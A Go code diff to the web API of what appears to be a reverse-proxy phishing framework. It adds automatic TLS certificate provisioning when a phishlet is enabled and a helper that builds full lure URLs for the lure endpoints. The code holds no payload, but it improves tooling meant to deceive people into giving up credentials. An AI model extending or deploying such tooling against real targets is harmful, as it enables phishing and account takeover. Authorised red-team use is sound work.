@@ -678,6 +678,22 @@ func (w *WebAPI) handlePhishletEnable(rw http.ResponseWriter, req *http.Request)
 
 	log.Important("WebAPI: Enabled phishlet '%s'", phishlet.Name)
 
+	// Mirror terminal behaviour: provision TLS certificates for the newly enabled phishlet.
+	if w.hp != nil && !w.hp.developer {
+		go func() {
+			if w.cfg.IsAutocertEnabled() {
+				hosts := w.hp.cfg.GetActiveHostnames("")
+				if err := w.hp.crt_db.setManagedSync(hosts, 60*time.Second); err != nil {
+					log.Error("WebAPI: failed to provision TLS certificates after enabling '%s': %s", payload.Name, err)
+				}
+			} else {
+				if err := w.hp.crt_db.setUnmanagedSync(false); err != nil {
+					log.Error("WebAPI: failed to provision TLS certificates after enabling '%s': %s", payload.Name, err)
+				}
+			}
+		}()
+	}
+
 	user, _ := w.getUserFromRequest(req)
 	username := "unknown"
 	if user != nil {
@@ -923,6 +939,23 @@ func (w *WebAPI) handlePhishletYAML(rw http.ResponseWriter, req *http.Request) {
 
 // ---------- Lures ----------
 
+// resolveLureUrl returns the full https:// URL for a lure, or "" if the
+// phishlet is not yet configured with a hostname.
+func (w *WebAPI) resolveLureUrl(l *Lure) string {
+	if l.Hostname != "" {
+		return "https://" + l.Hostname + l.Path
+	}
+	pl, err := w.cfg.GetPhishlet(l.Phishlet)
+	if err != nil {
+		return ""
+	}
+	purl, err := pl.GetLureUrl(l.Path)
+	if err != nil {
+		return ""
+	}
+	return purl
+}
+
 func (w *WebAPI) handleLures(rw http.ResponseWriter, req *http.Request) {
 	if req.Method != http.MethodGet {
 		http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
@@ -933,29 +966,14 @@ func (w *WebAPI) handleLures(rw http.ResponseWriter, req *http.Request) {
 	for i := 0; i < w.cfg.GetLureCount(); i++ {
 		l, err := w.cfg.GetLure(i)
 		if err == nil {
-			// Resolve effective hostname: lure override > phishlet hostname
-			hostname := l.Hostname
-			if hostname == "" {
-				pl, perr := w.cfg.GetPhishlet(l.Phishlet)
-				if perr == nil {
-					purl, uerr := pl.GetLureUrl(l.Path)
-					if uerr == nil && len(purl) > len("https://") {
-						// Extract hostname from https://host/path
-						hostPath := purl[len("https://"):]
-						if idx := strings.Index(hostPath, "/"); idx != -1 {
-							hostname = hostPath[:idx]
-						} else {
-							hostname = hostPath
-						}
-					}
-				}
-			}
+			lureUrl := w.resolveLureUrl(l)
 			lures = append(lures, map[string]interface{}{
 				"index":           i,
 				"id":              l.Id,
 				"phishlet":        l.Phishlet,
-				"hostname":        hostname,
 				"path":            l.Path,
+				"hostname":        l.Hostname,
+				"url":             lureUrl,
 				"redirect_url":    l.RedirectUrl,
 				"redirector":      l.Redirector,
 				"post_redirector": l.PostRedirector,
@@ -1125,6 +1143,7 @@ func (w *WebAPI) handleLureCreate(rw http.ResponseWriter, req *http.Request) {
 		"phishlet":     l.Phishlet,
 		"path":         l.Path,
 		"hostname":     l.Hostname,
+		"url":          w.resolveLureUrl(l),
 		"redirect_url": l.RedirectUrl,
 		"info":         l.Info,
 	})
